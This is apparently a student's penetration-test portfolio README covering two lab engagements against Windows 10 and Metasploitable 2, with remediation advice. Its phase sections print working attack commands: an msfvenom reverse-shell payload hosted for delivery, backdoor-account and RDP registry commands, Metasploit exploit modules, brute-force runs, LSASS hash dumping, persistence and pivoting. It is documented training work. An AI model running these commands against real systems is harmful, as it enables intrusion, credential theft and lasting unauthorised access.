# Security Assessment Portfolio — Analysis & Summary

> **Author:** Muktadi  
> **Classification:** CONFIDENTIAL  
> **Scope:** Two penetration test engagements conducted in controlled lab environments  
> **Purpose:** Educational security research and defensive practice documentation

---

## Table of Contents

1. [Overview](#overview)
2. [Engagement 1 — Windows 10 Target (DESKTOP-AR0UM8P)](#engagement-1--windows-10-target)
   - [Lab Environment](#lab-environment-1)
   - [Attack Chain Summary](#attack-chain-summary)
   - [Phase 1: Payload Generation](#phase-1-payload-generation)
   - [Phase 2: Privilege Escalation](#phase-2-privilege-escalation)
   - [Phase 3: Lateral Movement](#phase-3-lateral-movement)
   - [Phase 4: Persistence](#phase-4-persistence)
   - [Vulnerabilities Found](#vulnerabilities-found--engagement-1)
3. [Engagement 2 — Metasploitable 2 Red Team Assessment](#engagement-2--metasploitable-2-red-team-assessment)
   - [Lab Environment](#lab-environment-2)
   - [Reconnaissance](#reconnaissance--enumeration)
   - [FTP Exploitation (Port 21)](#41-port-21--ftp-vsftpd-234-backdoor)
   - [SSH Exploitation (Port 22)](#42-port-22--ssh-brute-force)
   - [Telnet Exploitation (Port 23)](#43-port-23--telnet)
   - [HTTP Exploitation (Port 80)](#44-port-80--http-php-cgi-injection)
   - [SMB Exploitation (Port 445)](#45-port-445--smb-samba-rce)
   - [MySQL Exploitation (Port 3306)](#46-port-3306--mysql-no-root-password)
   - [Post-Exploitation & Pivoting](#5-post-exploitation--pivoting)
   - [Vulnerabilities Found](#vulnerabilities-found--engagement-2)
4. [Cross-Engagement Analysis](#cross-engagement-analysis)
5. [Consolidated Remediation Recommendations](#consolidated-remediation-recommendations)
6. [Skill Coverage & Tools Used](#skill-coverage--tools-used)
7. [Disclaimer](#disclaimer)

---

## Overview

This README documents and analyses two complete penetration test engagements performed by **Muktadi** in isolated virtual lab environments. The first engagement targets a standalone Windows 10 workstation; the second is a full red team simulation against a Metasploitable 2 bridge with a Windows 10 internal pivot target.

Both engagements were converted from their original PDF reports into professional `.docx` Word documents as part of this session.

| Property | Engagement 1 | Engagement 2 |
|---|---|---|
| Target | DESKTOP-AR0UM8P (Windows 10) | Metasploitable 2 + Windows 10 |
| Target IP | 192.168.40.140 | 192.168.50.3 / 10.10.10.4 |
| Attacker IP | 192.168.40.136 (Kali Linux) | 192.168.50.2 (Kali Linux) |
| Overall Risk | **CRITICAL** | **CRITICAL** |
| Services Exploited | 1 primary + CVE-2024-23692 | 6 services |
| Final Access | NT AUTHORITY\SYSTEM | root + Windows Meterpreter |
| Methodology | PTES | PTES / OWASP Testing Guide |
| Report Date | May 16, 2026 | May 17, 2026 |

---

## Engagement 1 — Windows 10 Target

### Lab Environment 1

```
Attacker (Kali Linux)          Target (Windows 10)
192.168.40.136       ←——→      192.168.40.140
                               DESKTOP-AR0UM8P
                               Domain: WORKGROUP
                               OS: Windows 10 22H2 (Build 19045)
                               Architecture: x64
```

---

### Attack Chain Summary

| Phase | Action | Result |
|---|---|---|
| 1 | Payload generation via msfvenom | `Malware1122.exe` created (7,168 bytes) |
| 2 | Victim executed payload | Meterpreter Session 1 opened |
| 3 | Privilege escalation via token abuse | NT AUTHORITY\SYSTEM (Session 2) |
| 4 | LSASS migration + hashdump | 5 NTLM hashes extracted |
| 5 | CVE-2024-23692 exploitation | Second independent SYSTEM shell |
| 6 | RDP enabled + backdoor account created | Full GUI access confirmed |
| 7 | Windows service persistence implanted | Reboot-surviving backdoor (Session 5) |

---

### Phase 1: Payload Generation

A reverse TCP Meterpreter payload was generated using `msfvenom` with 100 encoding iterations for basic AV evasion, then hosted over Apache HTTP to simulate a drive-by download delivery.

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.40.136 \
         LPORT=1122 \
         -f exe -i 100 > Malware1122.exe

mv Malware1122.exe /var/www/html
service apache2 start
```

**Payload specifications:**

| Parameter | Value |
|---|---|
| Module | `windows/meterpreter/reverse_tcp` |
| Output file | `Malware1122.exe` |
| LHOST | 192.168.40.136 |
| LPORT | 1122 |
| Iterations | 100 (encoding) |
| Architecture | x86 |
| Final size | 7,168 bytes |

> **Note:** No commercial-grade obfuscation was used. Modern EDR with behavioural analysis would likely detect this at execution time. Effective in environments without endpoint protection.

---

### Phase 2: Privilege Escalation

Initial session ran with limited user privileges. The first `getsystem` attempt failed across all named pipe impersonation and token duplication methods. The **Incognito** extension was then loaded to enumerate delegation tokens, revealing an available `NT AUTHORITY\SYSTEM` token.

```
Delegation Tokens Available:
  DESKTOP-AR0UM8P\Muktadi
  NT AUTHORITY\SYSTEM
```

A second session was launched with elevated context, and `getsystem` succeeded via **Named Pipe Impersonation (In Memory/Admin)**.

| Finding | Detail |
|---|---|
| Technique | Named Pipe Impersonation (In Memory/Admin) |
| Result | NT AUTHORITY\SYSTEM |
| CWE | CWE-269: Improper Privilege Management |
| Severity | **CRITICAL** |

---

### Phase 3: Lateral Movement

#### Credential Harvesting

With SYSTEM privileges, the Meterpreter agent was migrated into the `lsass.exe` process (PID 652) to extract NTLM password hashes:

```
Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Muktadi:1000:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435...:371ba991...:::
```

Hashes were cracked offline using **John the Ripper** (rockyou.txt) and **Hashcat** — the Administrator hash was fully recovered; 33% of unique hashes cracked overall.

#### RDP Activation & Backdoor Account

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net user ifti pa$$w0rd /add
net localgroup administrators ifti /add
```

#### CVE-2024-23692 — Rejetto HFS Unauthenticated RCE

A second independent attack vector was identified. The target ran Rejetto HTTP File Server v2.3m, vulnerable to unauthenticated RCE via template injection.

| Property | Value |
|---|---|
| CVE | CVE-2024-23692 |
| Software | Rejetto HFS v2.3m |
| Disclosure | May 25, 2024 |
| CVSS Score | **9.8 (Critical)** |
| Attack Vector | Network (no auth required) |
| CWE | CWE-94: Code Injection |

```
[+] The target is vulnerable. Rejetto HFS version 2.3m
[*] Meterpreter session 1 opened (192.168.40.136:4444 -> 192.168.40.140:65470)
```

---

### Phase 4: Persistence

A Windows service-based persistence mechanism was deployed using `exploit/windows/persistence/service`, dropping `C:\Windows\TEMP\flytjt.exe` as an auto-start service.

```
[+] Payload written to C:\Windows\TEMP\flytjt.exe
[*] Meterpreter session 5 opened (persistent — survives reboot)
```

| Property | Value |
|---|---|
| Payload Location | `C:\Windows\TEMP\flytjt.exe` |
| Persistence Method | Windows Service (auto-start on reboot) |
| Callback | 192.168.40.136:4444 |
| Session Privilege | NT AUTHORITY\SYSTEM |
| CWE | CWE-912: Hidden Functionality / Backdoor |

---

### Attack Timeline — Engagement 1

| Timestamp | Action | Outcome |
|---|---|---|
| ~06:00 | msfvenom payload creation | `Malware1122.exe` generated |
| 06:17 | Victim executed payload | Meterpreter Session 1 opened |
| 06:22 | Incognito + getsystem | SYSTEM obtained (Session 2) |
| ~06:30 | LSASS migration + hashdump | 5 NTLM hashes extracted |
| 07:05 | Remmina RDP connection | Full GUI desktop access |
| 07:16 | John the Ripper cracking | Administrator hash cracked |
| 07:21 | Hashcat NTLM cracking | 33% unique hashes recovered |
| 09:47 | CVE-2024-23692 exploitation | Second SYSTEM session via Rejetto HFS |
| 10:20 | Persistence service deployed | Reboot-surviving backdoor installed |
| 10:25 | Session 5 verified active | Persistent SYSTEM shell confirmed |

---

### Vulnerabilities Found — Engagement 1

| # | Vulnerability | Severity | CVE / CWE | Impact |
|---|---|---|---|---|
| 1 | Meterpreter Reverse Shell via HTTP | HIGH | CWE-494 | Initial access; code execution |
| 2 | Privilege Escalation to SYSTEM | **CRITICAL** | CWE-269 | Complete OS takeover |
| 3 | LSASS Memory Dump & NTLM Hash Extraction | **CRITICAL** | CWE-522 | Credential compromise |
| 4 | CVE-2024-23692 Rejetto HFS Unauth RCE | **CRITICAL** | CVE-2024-23692 | Unauthenticated remote shell |
| 5 | RDP Enabled & Backdoor Admin Account | **CRITICAL** | CWE-284 | Persistent admin GUI access |
| 6 | Windows Service Persistence Implant | **CRITICAL** | CWE-912 | Reboot-surviving backdoor |

---

## Engagement 2 — Metasploitable 2 Red Team Assessment

### Lab Environment 2

```
┌─────────────────────────────────────────────────────────┐
│                   External vLAN 1                        │
│                  192.168.50.0/24                         │
│                                                          │
│  [Kali Linux]           [Metasploitable 2 — Bridge]      │
│  192.168.50.2  ←——→    192.168.50.3 (eth0)              │
│                          10.10.10.5 (eth1) ←——→         │
│                                    [Windows 10 Target]   │
│                Internal vLAN 2      10.10.10.4           │
│                10.10.10.0/24                             │
└─────────────────────────────────────────────────────────┘
```

| Role | Host | IP |
|---|---|---|
| Attacker | Kali Linux | 192.168.50.2 |
| Pivot / Bridge | Metasploitable 2 | 192.168.50.3 (eth0) / 10.10.10.5 (eth1) |
| Internal Target | Windows 10 | 10.10.10.4 |

IP forwarding was enabled on Metasploitable 2 to route packets between both subnets, simulating a dual-homed corporate DMZ server.

---

### Reconnaissance & Enumeration

```bash
netdiscover -r 192.168.50.0/24
nmap -p- -sV -sC -O 192.168.50.3
```

#### Key Services Identified

| Port | Protocol | Service / Version | Vulnerability |
|---|---|---|---|
| 21 | FTP | vsftpd 2.3.4 | CVE-2011-2523 — Backdoor |
| 22 | SSH | OpenSSH 4.7p1 | Weak / Default Credentials |
| 23 | Telnet | Linux telnetd | Cleartext + Default Credentials |
| 80 | HTTP | Apache 2.2.8 + PHP | CVE-2012-1823 — PHP-CGI Injection |
| 445 | SMB | Samba smbd 3.0.20 | CVE-2007-2447 — usermap_script RCE |
| 3306 | MySQL | MySQL 5.0.51a | No root password — open access |

---

### 4.1 Port 21 — FTP (vsftpd 2.3.4 Backdoor)

**Severity: CRITICAL | CVSS: 10.0 | CVE: CVE-2011-2523**

The vsftpd 2.3.4 binary was trojanised in 2011. Authenticating with a username ending in the smiley-face sequence (`:)`) triggers the service to open a root listener on TCP port 6200.

**Method 1 — Hydra Brute Force:**
```bash
hydra -L user.txt -P pass.txt 192.168.50.3 ftp
# Result: msfadmin:msfadmin, user:user
ftp 192.168.50.3
```

**Method 2 — Metasploit Backdoor Module:**
```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.50.3
msf6 > exploit
# [+] Backdoor has been spawned!
# whoami → root
```

**Remediation:**
- Upgrade vsftpd immediately (backdoor removed in later releases)
- Block port 21 via firewall; replace FTP with SFTP/SCP
- Alert on unexpected listeners on port 6200

---

### 4.2 Port 22 — SSH (Brute Force)

**Severity: HIGH | CVSS: 7.5 | CVE: N/A — Weak Credentials**

OpenSSH accepted password-based authentication with default Metasploitable credentials. Medusa performed a dictionary attack and recovered valid credentials within seconds.

```bash
medusa -h 192.168.50.3 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh
# ACCOUNT FOUND: msfadmin:msfadmin [SUCCESS]
ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.50.3
```

**Remediation:**
- Enforce SSH key-based authentication; disable `PasswordAuthentication` in `sshd_config`
- Deploy fail2ban to block IPs after repeated failures
- Rotate all default credentials immediately
- Move SSH to a non-standard port; disable root login

---

### 4.3 Port 23 — Telnet

**Severity: HIGH | CVSS: 7.5 | CVE: N/A — Insecure Protocol**

Telnet transmits all traffic — including credentials — in cleartext. The Metasploitable 2 banner even advertised the default login credentials directly.

**Method 1 — Direct Login (credentials advertised in banner):**
```bash
telnet 192.168.50.3
# Banner: "Login with msfadmin/msfadmin to get started"
```

**Method 2 — Hydra + Metasploit Session Upgrade:**
```bash
hydra -l msfadmin -p msfadmin telnet://192.168.50.3
msf6 > use auxiliary/scanner/telnet/telnet_login
msf6 > sessions -u 1   # upgrade to Meterpreter
```

**Remediation:**
- Disable Telnet immediately; use SSH exclusively
- Block port 23 at the perimeter firewall
- Apply network-level packet inspection (IDS/IPS)

---

### 4.4 Port 80 — HTTP (PHP-CGI Injection)

**Severity: CRITICAL | CVSS: 9.8 | CVE: CVE-2012-1823**

Apache 2.2.8 runs PHP in CGI mode. PHP versions ≤5.3.12 and ≤5.4.2 pass unescaped query strings as arguments to the PHP binary, allowing `-d` directives to be injected and arbitrary code executed.

```bash
msf6 > use exploit/multi/http/php_cgi_arg_injection
msf6 > set RHOSTS 192.168.50.3
msf6 > set LHOST 192.168.50.2
msf6 > exploit
# Meterpreter session opened — getuid: www-data
```

**Remediation:**
- Upgrade PHP to a patched version immediately
- Disable PHP-CGI mode; use PHP-FPM instead
- Deploy a Web Application Firewall (WAF) to filter malicious query strings
- Run the web server under a minimal-privilege account; enable HTTPS

---

### 4.5 Port 445 — SMB/Samba (RCE)

**Severity: CRITICAL | CVSS: 10.0 | CVE: CVE-2007-2447**

Samba 3.0.20–3.0.25rc3 improperly handles the `username map script` configuration option. Shell metacharacters embedded in a username cause the Samba daemon to execute arbitrary commands as root — with no authentication required.

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 > set RHOSTS 192.168.50.3
msf6 > set LHOST 192.168.50.2
msf6 > exploit
# whoami → root
```

**Remediation:**
- Upgrade Samba to 3.0.25 or later
- Restrict SMB ports (139/445) via firewall; disable SMB if unused
- Use VPN for any legitimate SMB access; segment file servers from external networks

---

### 4.6 Port 3306 — MySQL (No Root Password)

**Severity: CRITICAL | CVSS: 9.8 | CWE: CWE-521**

MySQL 5.0.51a was configured with no password on the root account, and remote root login was permitted. Any machine on the network could connect and gain full administrative database control.

```bash
# Metasploit scanner confirmed blank root password
msf6 > use auxiliary/scanner/mysql/mysql_login
# [+] Login Successful: root: (blank password)

# Direct connection
mysql -h 192.168.50.3 -u root --skip-ssl
# show databases → information_schema, dvwa, metasploit, mysql, owasp10, tikiwiki
```

**Remediation:**
- Set a strong root password immediately
- Disable remote root login; restrict port 3306 to trusted IPs only
- Enforce least privilege — application accounts access only their own database
- Migrate to a modern, supported MySQL/MariaDB version

---

### 5. Post-Exploitation & Pivoting

With root access on the Metasploitable 2 bridge, Metasploit's routing capabilities were used to tunnel traffic into the internal vLAN 2 and target the Windows 10 endpoint.

#### Step-by-Step Pivot Chain

```bash
# 1. Establish Meterpreter on bridge via Samba exploit
msf6 > use exploit/multi/samba/usermap_script
msf6 > sessions -u 1   # upgrade to Meterpreter (Session 2)

# 2. Add internal route through pivot
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 2
msf6 > set SUBNET 10.10.10.0
# [+] Route added: 10.10.10.0/255.255.255.0 via session 2

# 3. Port scan internal target through pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.4
# [+] 10.10.10.4:445 OPEN  |  135 OPEN  |  3389 OPEN (RDP)

# 4. Generate Windows payload
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.50.2 LPORT=5555 \
         -f exe -o payload.exe

# 5. Set handler + deliver through pivot
# [*] Meterpreter session 3 opened (192.168.50.2:5555 -> 10.10.10.4:49xxx)
# sysinfo → DESKTOP-WIN10 | Windows 10 Build 19041
# getuid  → DESKTOP-WIN10\User
```

#### Post-Exploitation on Windows Target

```bash
meterpreter > hashdump          # Dump Windows credentials
meterpreter > screenshot        # Capture desktop screenshot
meterpreter > search -f *.txt -d C:\Users   # Hunt sensitive files
meterpreter > migrate [PID]     # Migrate to stable explorer.exe process
```

---

### Attack Results — Engagement 2

| Port / Service | Vulnerability | Severity | Outcome |
|---|---|---|---|
| 21 / FTP | vsftpd 2.3.4 Backdoor (CVE-2011-2523) | **Critical** | Root shell via Metasploit |
| 22 / SSH | Weak / Default Credentials | High | Full shell — msfadmin:msfadmin |
| 23 / Telnet | Cleartext + Default Credentials | High | Remote shell via Hydra |
| 80 / HTTP | PHP-CGI Injection (CVE-2012-1823) | **Critical** | Meterpreter as www-data |
| 445 / SMB | Samba usermap_script (CVE-2007-2447) | **Critical** | Root shell via Metasploit |
| 3306 / MySQL | No root password | **Critical** | Full DB admin access |
| Internal / Win10 | Pivot via bridge | **Critical** | Meterpreter foothold on 10.10.10.4 |

### Vulnerabilities Found — Engagement 2

| # | Finding | Port | CVE / CWE | Severity |
|---|---|---|---|---|
| 1 | vsftpd 2.3.4 Backdoor | 21 | CVE-2011-2523 | **Critical** |
| 2 | SSH Weak Default Credentials | 22 | CWE-521 | High |
| 3 | Telnet Cleartext Protocol | 23 | CWE-312 | High |
| 4 | PHP-CGI Argument Injection | 80 | CVE-2012-1823 | **Critical** |
| 5 | Samba usermap_script RCE | 445 | CVE-2007-2447 | **Critical** |
| 6 | MySQL No Root Password | 3306 | CWE-521 | **Critical** |
| 7 | Internal Network Pivoting | Bridge | CWE-284 | **Critical** |

---

## Cross-Engagement Analysis

### Common Themes Across Both Engagements

| Theme | Engagement 1 | Engagement 2 |
|---|---|---|
| **Default / weak credentials** | N/A (payload-based entry) | SSH, Telnet, MySQL all used default `msfadmin:msfadmin` or blank passwords |
| **Unpatched software with known CVEs** | CVE-2024-23692 (Rejetto HFS) | CVE-2011-2523, CVE-2012-1823, CVE-2007-2447 |
| **Privilege escalation** | Named Pipe Impersonation → SYSTEM | Root-level access achieved directly on most services |
| **Credential harvesting** | LSASS dump (hashdump) | MySQL direct access; SSH credential recovery |
| **Lateral movement / pivoting** | RDP + CVE-2024-23692 second vector | Full pivot through Metasploitable 2 bridge to Windows 10 |
| **Persistence** | Windows service implant (survives reboot) | Multiple Meterpreter sessions; Windows payload via pivot |
| **Cleartext transmission** | N/A | Telnet exposed credentials on the wire |
| **No EDR / AV protection** | Raw msfvenom payload executed | No detection on any of the 6 exploited services |

### Attack Complexity Comparison

| Metric | Engagement 1 | Engagement 2 |
|---|---|---|
| Entry method | Social engineering (payload via HTTP) | Multiple direct service exploits |
| Services attacked | 2 (primary + HFS) | 6 |
| CVEs exploited | 1 (CVE-2024-23692) | 3 (CVE-2011-2523, CVE-2012-1823, CVE-2007-2447) |
| Networks traversed | 1 | 2 (external → internal via pivot) |
| Time to SYSTEM/root | ~22 minutes | Minutes per service |
| Persistence achieved | Yes (Windows service) | Yes (Meterpreter sessions) |

### Most Critical Findings (Both Engagements Combined)

1. **Unauthenticated RCE** (CVE-2024-23692, CVE-2011-2523, CVE-2007-2447) — three separate services allowed full root/SYSTEM access without any credentials
2. **LSASS memory exposure** — no Credential Guard enabled; all account hashes were dumpable
3. **Default credentials on every service** — automated tools recovered them in seconds
4. **No network segmentation enforcement** — lateral movement and pivoting were trivial
5. **No endpoint protection** — raw, unobfuscated payloads executed without detection

---

## Consolidated Remediation Recommendations

### Immediate Actions (Critical Priority)

| Finding | Action |
|---|---|
| Rejetto HFS CVE-2024-23692 | Patch or uninstall immediately — public exploit, no auth required |
| vsftpd CVE-2011-2523 | Upgrade vsftpd; block port 21; switch to SFTP/SCP |
| Samba CVE-2007-2447 | Upgrade to Samba 3.0.25+; disable SMB if unused |
| PHP-CGI CVE-2012-1823 | Upgrade PHP + Apache; disable CGI mode |
| Default credentials (all services) | Rotate immediately; enforce complexity policy |
| MySQL blank root password | Set strong password; disable remote root login |
| Backdoor account 'ifti' | Remove account; audit all local administrator memberships |
| Persistence payload | Locate and delete `C:\Windows\TEMP\flytjt.exe`; remove service |
| RDP exposure | Restrict to VPN/jump host only; enforce NLA |
| Compromised hosts | Isolate from network pending full remediation |

### Short-Term Hardening

- **Endpoint Detection & Response (EDR):** Deploy a solution capable of detecting process injection, LSASS memory access, and anomalous parent-child process relationships
- **Windows Credential Guard:** Prevent user-mode processes from reading LSASS memory
- **Least Privilege:** Remove `SeImpersonatePrivilege` from standard user accounts; eliminate delegation token exposure
- **Attack Surface Reduction (ASR):** Enable Windows Defender ASR rules targeting credential theft
- **Application Allowlisting:** Block execution of unsigned or unrecognised executables
- **Firewall Rules:** Restrict outbound connections on non-standard ports; block management ports (21, 22, 23, 445, 3306) from untrusted sources
- **fail2ban:** Block IPs after repeated authentication failures on SSH and other services
- **PHP-FPM:** Replace PHP-CGI mode; deploy a WAF to filter malicious query strings

### Long-Term Strategic Controls

- **Network Segmentation:** Isolate workstations, servers, and databases into separate VLANs; limit lateral movement paths
- **SIEM Deployment:** Monitor for indicators of compromise — unusual process spawning, LSASS access, registry changes enabling RDP, unexpected outbound TCP
- **Multi-Factor Authentication (MFA):** Enforce on all remote access including RDP, VPN, and SSH
- **Patch Management Programme:** Implement a regular patching cycle with defined SLAs; all exploited services were running versions that were years out of date
- **Vulnerability Scanning:** Schedule automated scans with tools such as Nessus or OpenVAS; treat findings as prioritised work items
- **Security Awareness Training:** Reduce social-engineering risk — users should not execute files delivered via HTTP
- **Annual Penetration Testing:** Maintain a schedule of structured assessments to identify emerging attack surfaces before attackers do

---

## Skill Coverage & Tools Used

### Offensive Tools

| Tool | Purpose | Used In |
|---|---|---|
| `msfvenom` | Payload generation | Engagement 1 & 2 |
| `msfconsole` / Metasploit | Exploitation framework | Both |
| `Hydra` | Network login brute-force | Both |
| `Medusa` | SSH/service brute-force | Engagement 2 |
| `nmap` | Port scanning & service detection | Both |
| `netdiscover` | Host discovery | Engagement 2 |
| `John the Ripper` | Offline hash cracking | Engagement 1 |
| `Hashcat` | GPU-accelerated hash cracking | Engagement 1 |
| `Remmina` | RDP graphical access | Engagement 1 |
| `mysql` client | Direct database access | Engagement 2 |

### Metasploit Modules Used

| Module | Target | Result |
|---|---|---|
| `multi/handler` | Both | Catch reverse shells |
| `exploit/unix/ftp/vsftpd_234_backdoor` | FTP port 21 | Root shell |
| `auxiliary/scanner/telnet/telnet_login` | Telnet port 23 | Credential discovery |
| `exploit/multi/http/php_cgi_arg_injection` | HTTP port 80 | www-data shell |
| `exploit/multi/samba/usermap_script` | SMB port 445 | Root shell |
| `auxiliary/scanner/mysql/mysql_login` | MySQL port 3306 | Blank password confirmed |
| `post/multi/manage/autoroute` | Pivot | Internal route via Session 2 |
| `auxiliary/scanner/portscan/tcp` | Internal scan | Windows 10 port map |
| `post/windows/manage/enable_rdp` | Windows 10 | RDP activation |
| `exploit/windows/persistence/service` | Windows 10 | Reboot-surviving backdoor |
| `exploit/windows/http/rejetto_hfs_rce_cve_2024_23692` | HFS service | SYSTEM shell |

### Techniques by MITRE ATT&CK Category

| Category | Technique |
|---|---|
| Initial Access | Phishing/Drive-by (T1204), Exploit Public-Facing Application (T1190) |
| Execution | User Execution (T1204), Command & Scripting Interpreter (T1059) |
| Persistence | Windows Service (T1543.003) |
| Privilege Escalation | Named Pipe Impersonation (T1134), Token Impersonation (T1134.001) |
| Credential Access | LSASS Memory Dump (T1003.001), Brute Force (T1110) |
| Lateral Movement | Internal Spearphishing via Pivot, SMB/RDP (T1021) |
| Collection | Screen Capture (T1113), File Search (T1083) |
| Command & Control | Reverse TCP Meterpreter (T1095) |

---

## Documents Produced in This Session

| File | Description |
|---|---|
| `Penetration_Test_Report_Paraphrased.docx` | Word document — paraphrased version of the Windows 10 pentest report (Engagement 1) |
| `README.md` | This file — full analysis of both engagements |

---

## Disclaimer

Both penetration tests documented in this README were conducted exclusively in **controlled, isolated lab environments** for **educational and authorised security research purposes only**. All activities were performed against virtual machines owned and operated by the tester.

The techniques, tools, and vulnerabilities described are published solely to support **defensive security practices** and **responsible vulnerability disclosure**.

> Applying any of the techniques described in this document against systems without **explicit written authorisation** from the system owner is unlawful and unethical.

---

*Prepared by: Muktadi | Portfolio compiled: May 2026*
